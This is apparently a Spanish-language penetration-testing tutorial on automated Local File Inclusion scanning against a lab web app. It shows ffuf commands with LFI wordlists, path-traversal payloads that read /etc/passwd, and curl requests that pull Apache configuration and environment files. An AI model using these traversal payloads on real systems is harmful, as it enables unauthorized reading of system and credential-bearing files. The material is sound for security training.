vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```


Una vez que identificamos un parámetro expuesto que no está vinculado a ningún formulario que probamos, podemos realizar todas las pruebas LFI discutidas en este módulo. Esto no es exclusivo de las vulnerabilidades LFI, sino que también se aplica a la mayoría de las vulnerabilidades web discutidas en otros módulos, ya que los parámetros expuestos también pueden ser vulnerables a cualquier otra vulnerabilidad.

>**Consejo:** 
>Para un escaneo más preciso, podemos limitar nuestro escaneo a los parámetros LFI más populares que se encuentran en esto [enlace](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).


## Listas de palabras LFI

Hasta ahora, en este módulo, hemos estado elaborando manualmente nuestras cargas útiles LFI para probar las vulnerabilidades LFI. 
Esto se debe a que las pruebas manuales son más confiables y pueden encontrar vulnerabilidades LFI que pueden no identificarse de otra manera, como se discutió anteriormente. 
Sin embargo, en muchos casos, es posible que deseemos ejecutar una prueba rápida en un parámetro para ver si es vulnerable a cualquier carga útil LFI común, lo que puede ahorrarnos tiempo en aplicaciones web donde necesitamos probar varias vulnerabilidades.


Hay varios [Listas de palabras LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) podemos utilizar para este escaneo. Una buena lista de palabras es [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), ya que contiene varios bypasses y archivos comunes, por lo que facilita la ejecución de varias pruebas a la vez. Podemos usar esta lista de palabras para borrar el `?language=` parámetro que hemos estado probando en todo el módulo, de la siguiente manera:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Como podemos ver, el escaneo produjo una serie de cargas útiles LFI que se pueden usar para explotar la vulnerabilidad. Una vez que tengamos las cargas útiles identificadas, debemos probarlas manualmente para verificar que funcionan como se esperaba y mostrar el contenido del archivo incluido.



## Archivos de Servidor Fuzzing

Además de borrar las cargas útiles de LFI, hay diferentes archivos de servidor que pueden ser útiles en nuestra explotación de LFI, por lo que sería útil saber dónde existen dichos archivos y si podemos leerlos. Tales archivos incluyen: `Server webroot path`, `server configurations file`, y `server logs`.

#### Servidor Webroot

Es posible que necesitemos conocer la ruta completa de la raíz web del servidor para completar nuestra explotación en algunos casos. Por ejemplo, si queríamos localizar un archivo que subimos, pero no podemos alcanzar su `/uploads` directorio a través de rutas relativas (p. ej. `../../uploads`). En tales casos, es posible que tengamos que averiguar la ruta webroot del servidor para que podamos localizar nuestros archivos cargados a través de rutas absolutas en lugar de rutas relativas.

Para hacerlo, podemos fuzz para el `index.php` archivo a través de rutas de webroot comunes, que podemos encontrar en este [lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o esto [lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Dependiendo de nuestra situación de LFI, es posible que tengamos que agregar algunos directorios (por ejemplo. `../../../../`), y luego añadir nuestro `index.php` palabras clave.

El siguiente es un ejemplo de cómo podemos hacer todo esto con ffuf:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Como podemos ver, el escaneo identificó la ruta correcta de la raíz web en (`/var/www/html/`). También podemos usar lo mismo [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) lista de palabras que usamos anteriormente, ya que también contiene varias cargas útiles que pueden revelar la raíz web. Si esto no nos ayuda a identificar el webroot, entonces nuestra mejor opción sería leer las configuraciones del servidor, ya que tienden a contener el webroot y otra información importante, como veremos a continuación.


#### Registros/Configuraciones del Servidor

Como hemos visto en la sección anterior, necesitamos poder identificar el directorio de registros correcto para poder realizar los ataques de envenenamiento de registros que discutimos. Además, como acabamos de discutir, es posible que también necesitemos leer las configuraciones del servidor para poder identificar la ruta de la raíz web del servidor y otra información importante (¡como la ruta de los registros!).

Para hacerlo, también podemos usar el [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, ya que contiene muchos de los registros del servidor y las rutas de configuración que nos pueden interesar. Si quisiéramos un escaneo más preciso, podemos usar esto [lista de palabras para Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) o esto [lista de palabras para Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), aunque no son parte de `seclists`, así que tenemos que descargarlos primero. Probemos la lista de palabras de Linux contra nuestra vulnerabilidad LFI y veamos qué obtenemos:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

Como podemos ver, el escaneo devolvió más de 60 resultados, muchos de los cuales no se identificaron con el [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, que nos muestra que un escaneo preciso es importante en ciertos casos. Ahora, podemos intentar leer cualquiera de estos archivos para ver si podemos obtener su contenido. Leeremos (`/etc/apache2/apache2.conf`), ya que es una ruta conocida para la configuración del servidor apache:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

Como podemos ver, obtenemos la ruta de raíz web predeterminada y la ruta de registro. Sin embargo, en este caso, la ruta de registro está utilizando una variable apache global (`APACHE_LOG_DIR`), que se encuentran en otro archivo que vimos anteriormente, que es (`/etc/apache2/envvars`), y podemos leerlo para encontrar los valores variables:

  Escaneo Automatizado

```shell-session
vcrdcr@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

Como podemos ver, el (`APACHE_LOG_DIR`) La variable se establece en (`/var/log/apache2`), y la configuración anterior nos dijo que los archivos de registro son `/access.log` y `/error.log`, que han accedido en la sección anterior.

**Nota:** Por supuesto, simplemente podemos usar una lista de palabras para encontrar los registros, ya que varias listas de palabras que usamos en estas secciones mostraron la ubicación del registro. Pero este ejercicio nos muestra cómo podemos revisar manualmente los archivos identificados y luego usar la información que encontramos para identificar más archivos e información importante. Esto es bastante similar a cuando leemos diferentes fuentes de archivos en el `PHP filters` sección, y tales esfuerzos pueden revelar información previamente desconocida sobre la aplicación web, que podemos utilizar para explotarla aún más.


# Laboratorios

https://github.com/NetsecExplained/docker-labs

laboratorios/docker-labs/file-inclusion/college_website